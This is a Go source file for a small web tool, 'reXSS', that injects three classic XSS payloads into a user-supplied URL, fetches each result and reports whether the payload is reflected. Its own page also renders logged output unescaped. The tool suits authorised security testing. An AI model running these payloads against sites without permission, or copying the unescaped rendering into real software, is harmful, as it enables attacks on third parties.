package main

import (
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time" // Import package time untuk delay
)

var logs []string

func main() {
	// Serve static files
	http.Handle("/css/", http.StripPrefix("/css/", http.FileServer(http.Dir("css"))))

	// Handle other routes
	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/run", handleRun)
	http.HandleFunc("/download", handleDownload)
	log.Println("Server starting on port 8082...")
	log.Fatal(http.ListenAndServe(":8082", nil))
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	tmpl := `
<!doctype html>
<html lang="en" data-theme="dark">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/css/pico.min.css">
    <link rel="stylesheet" href="/css/pico.colors.min.css">
    <title>reXSS</title>
    <style>
      .status-success {
        background-color: #d4edda; /* Hijau muda */
        color: #155724; /* Hijau gelap */
        padding: 10px;
        border: 1px solid #c3e6cb;
        border-radius: 5px;
        margin-bottom: 10px;
      }
      .status-error {
        background-color: #f8d7da; /* Merah muda */
        color: #721c24; /* Merah gelap */
        padding: 10px;
        border: 1px solid #f5c6cb;
        border-radius: 5px;
        margin-bottom: 10px;
      }
      .output {
        background-color: #28a745;  /* Background hijau */
        padding: 10px;
        margin-top: 5px;
        margin-bottom: 5px;
        display: inline-block;  /* Adjust width dynamically based on content */
        color: white;
        border-radius: 5px;  /* Optional: Adds rounded corners */
        white-space: pre-wrap;  /* Allows the text to wrap if too long */
      }
      pre {
        white-space: pre-wrap; /* Memungkinkan baris baru dan spasi */
      }
    </style>
  </head>
  <body>
    <main class="container">
        <nav>
            <ul>
              <li><h2>reXSS</h2></li>
            </ul>
        </nav>
    </main>

    <main class="container-fluid">
        <h6>Command</h6>
        <form action="/run" method="post">
            <input type="text" name="url" placeholder="https://example.com/home.php?id={payload}" aria-label="Text">
            <button type="submit" class="pico-background-slate-900">Run</button>
        </form>
    </main>

    <article>
      <header>
        <p>
          <strong>Console Log</strong>
          <button id="download-log" class="contrast">Download Log</button>
        </p>
      </header>
      <pre>{{.Log}}</pre>
    </article>

    <script>
        document.getElementById('download-log').addEventListener('click', function() {
            window.location.href = '/download';
        });
    </script>

  </body>
</html>`
	t := template.New("index")
	t, err := t.Parse(tmpl)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	logData := ""
	if len(logs) > 0 {
		logData = strings.Join(logs, "\n\n")
	}

	t.Execute(w, map[string]template.HTML{"Log": template.HTML(logData)})
}

func handleRun(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		inputURL := r.FormValue("url")

		if inputURL == "" {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}

		payloads := []string{
			"<script>alert('XSS');</script>",
			"<img src=x onerror=alert('XSS')>",
			"<svg/onload=alert('XSS')>",
		}

		var results []string
		for _, payload := range payloads {
			// Encode payload to be safely included in URL
			encodedPayload := url.QueryEscape(payload)
			testURL := strings.Replace(inputURL, "{payload}", encodedPayload, 1)

			logData := fmt.Sprintf("Testing URL: %s", testURL)

			// Add delay before making the request
			time.Sleep(1 * time.Second)

			resp, err := http.Get(testURL)
			if err != nil {
				results = append(results, fmt.Sprintf("<div class='status-error'>%s - Error: %v</div>", logData, err))
				continue
			}
			defer resp.Body.Close()

			var statusClass string
			var statusOutput string
			body, _ := ioutil.ReadAll(resp.Body)
			bodyStr := string(body)

			if resp.StatusCode == http.StatusOK {
				if strings.Contains(bodyStr, "alert('XSS')") {
					statusClass = "output"
					statusOutput = fmt.Sprintf("<div class='%s'>XSS Injected Successfully! <script>alert('XSS');</script></div>", statusClass)
					// If successful, inject alert script in the response
				} else {
					statusClass = "output"
					statusOutput = fmt.Sprintf("<div class='%s'>%d</div>", statusClass, resp.StatusCode)
				}
				results = append(results, fmt.Sprintf("%s - Status: %s - Body Length: %d bytes", logData, statusOutput, len(body)))
			} else {
				statusClass = "status-error"
				statusOutput = fmt.Sprintf("<div class='%s'>%d</div>", statusClass, resp.StatusCode)
				results = append(results, fmt.Sprintf("%s - Status: %s", logData, statusOutput))
			}
		}

		logs = append(logs, strings.Join(results, "\n"))
	}

	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func handleDownload(w http.ResponseWriter, r *http.Request) {
	logContent := strings.Join(logs, "\n")

	w.Header().Set("Content-Disposition", "attachment; filename=log.txt")
	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(logContent))
}
